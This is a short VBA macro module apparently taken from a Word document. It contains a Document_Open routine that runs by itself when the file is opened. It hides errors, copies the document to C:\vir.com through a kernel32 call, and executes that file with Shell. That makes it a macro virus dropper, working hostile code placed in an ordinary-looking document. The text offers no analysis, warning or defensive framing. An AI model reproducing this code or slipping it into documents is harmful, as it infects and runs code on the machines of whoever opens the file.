   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Declare Sub CopyFileA Lib "kernel32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
   Sub Document_Open()
   On Error Resume Next
   CopyFileA ActiveDocument.Name, "C:\vir.com", 0
   ChDir "C:\"
   Shell "C:\vir.com", 4
   End Sub
